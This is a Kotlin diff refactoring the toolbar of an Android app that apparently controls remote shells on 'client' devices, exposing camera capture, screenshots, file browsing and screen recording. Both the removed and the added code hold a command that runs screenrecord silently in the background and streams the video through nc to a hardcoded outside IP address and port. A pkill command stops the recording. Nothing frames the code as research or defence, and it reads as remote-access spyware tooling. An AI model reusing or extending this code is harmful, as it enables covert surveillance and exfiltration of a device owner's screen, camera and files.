@@ -19,6 +19,8 @@ import androidx.compose.material.icons.filled.PhotoCamera
 import androidx.compose.material.icons.filled.Save
 import androidx.compose.material.icons.filled.Settings
 import androidx.compose.material3.DrawerValue
+import androidx.compose.material3.DropdownMenu
+import androidx.compose.material3.DropdownMenuItem
 import androidx.compose.material3.TextButton
 import androidx.compose.material3.AlertDialog
 import androidx.compose.material3.ExperimentalMaterial3Api
@@ -38,8 +40,11 @@ import androidx.compose.runtime.SideEffect
 import androidx.compose.runtime.collectAsState
 import androidx.compose.runtime.remember
 import androidx.compose.runtime.getValue
+import androidx.compose.runtime.mutableStateOf
 import androidx.compose.runtime.rememberCoroutineScope
+import androidx.compose.runtime.setValue
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.graphics.vector.ImageVector
 import androidx.compose.ui.platform.LocalContext
 import androidx.lifecycle.viewmodel.compose.viewModel
 import com.kgapp.frpshell.frp.FrpLogBus
@@ -54,6 +59,7 @@ import androidx.compose.material.icons.filled.Videocam
 
 
 import androidx.compose.foundation.layout.padding
+import androidx.compose.foundation.layout.size
 import androidx.compose.ui.unit.dp
 
 @OptIn(ExperimentalMaterial3Api::class)
@@ -178,33 +184,17 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
                                     Icon(Icons.Default.Save, contentDescription = "save")
                                 }
                             } else if (!isSettings && !uiState.screenViewerVisible) {
-                                if (!uiState.fileManagerVisible && uiState.selectedTarget is ShellTarget.Client) {
-                                IconButton(onClick = { 
-                vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 47.113.126.123 40001 > /dev/null 2>&1 &")
-            }) {
-                Icon(Icons.Default.Videocam, contentDescription = "start recording")
-            }
-            
-            // 结束录屏按钮
-            IconButton(onClick = { 
-                vm.sendCommand("pkill -9 screenrecord")
-            }) {
-                Icon(Icons.Default.Stop, contentDescription = "stop recording")
-            }
-                                
-                                    IconButton(onClick = vm::openCameraSelector) {
-                                        Icon(Icons.Default.PhotoCamera, contentDescription = "take photo")
-                                    }
-                                    IconButton(onClick = vm::captureScreen) {
-                                        Icon(Icons.Default.Image, contentDescription = "capture screen")
-                                    }
-                                    IconButton(onClick = vm::openFileManager) {
-                                        Icon(Icons.Default.Folder, contentDescription = "file manager")
-                                    }
-                                }
-                                IconButton(onClick = vm::openSettings) {
-                                    Icon(Icons.Default.Settings, contentDescription = "settings")
-                                }
+                                TopBarMenus(
+                                    showClientActions = !uiState.fileManagerVisible && uiState.selectedTarget is ShellTarget.Client,
+                                    onOpenSettings = vm::openSettings,
+                                    onOpenCamera = vm::openCameraSelector,
+                                    onCaptureScreen = vm::captureScreen,
+                                    onStartRecord = {
+                                        vm.sendCommand("nohup screenrecord --bit-rate 100000 --output-format=h264 - | nc 47.113.126.123 40001 > /dev/null 2>&1 &")
+                                    },
+                                    onStopRecord = { vm.sendCommand("pkill -9 screenrecord") },
+                                    onOpenFileManager = vm::openFileManager
+                                )
                             }
                         }
                     )
@@ -377,3 +367,101 @@ fun MainScaffold(vm: MainViewModel = viewModel()) {
         }
     }
 }
+
+@Composable
+private fun TopBarMenus(
+    showClientActions: Boolean,
+    onOpenSettings: () -> Unit,
+    onOpenCamera: () -> Unit,
+    onCaptureScreen: () -> Unit,
+    onStartRecord: () -> Unit,
+    onStopRecord: () -> Unit,
+    onOpenFileManager: () -> Unit
+) {
+    var imageMenuExpanded by remember { mutableStateOf(false) }
+    var fileMenuExpanded by remember { mutableStateOf(false) }
+
+    if (showClientActions) {
+        IconButton(onClick = { fileMenuExpanded = true }) {
+            Icon(Icons.Default.Folder, contentDescription = "文件菜单")
+        }
+        DropdownMenu(
+            expanded = fileMenuExpanded,
+            onDismissRequest = { fileMenuExpanded = false }
+        ) {
+            TopMenuItem(
+                text = "文件管理",
+                icon = Icons.Default.Folder,
+                onClick = {
+                    fileMenuExpanded = false
+                    onOpenFileManager()
+                }
+            )
+        }
+
+        IconButton(onClick = { imageMenuExpanded = true }) {
+            Icon(Icons.Default.Image, contentDescription = "图像菜单")
+        }
+        DropdownMenu(
+            expanded = imageMenuExpanded,
+            onDismissRequest = { imageMenuExpanded = false }
+        ) {
+            TopMenuItem(
+                text = "拍照",
+                icon = Icons.Default.PhotoCamera,
+                onClick = {
+                    imageMenuExpanded = false
+                    onOpenCamera()
+                }
+            )
+            TopMenuItem(
+                text = "截屏",
+                icon = Icons.Default.Image,
+                onClick = {
+                    imageMenuExpanded = false
+                    onCaptureScreen()
+                }
+            )
+            TopMenuItem(
+                text = "开始录屏",
+                icon = Icons.Default.Videocam,
+                onClick = {
+                    imageMenuExpanded = false
+                    onStartRecord()
+                }
+            )
+            TopMenuItem(
+                text = "停止录屏",
+                icon = Icons.Default.Stop,
+                onClick = {
+                    imageMenuExpanded = false
+                    onStopRecord()
+                }
+            )
+        }
+    }
+
+    IconButton(onClick = onOpenSettings) {
+        Icon(Icons.Default.Settings, contentDescription = "settings")
+    }
+}
+
+@Composable
+private fun TopMenuItem(
+    text: String,
+    icon: ImageVector,
+    onClick: () -> Unit
+) {
+    DropdownMenuItem(
+        text = { Text(text) },
+        leadingIcon = {
+            Icon(
+                imageVector = icon,
+                contentDescription = null,
+                modifier = Modifier.size(20.dp)
+            )
+        },
+        onClick = onClick
+    )
+}
+
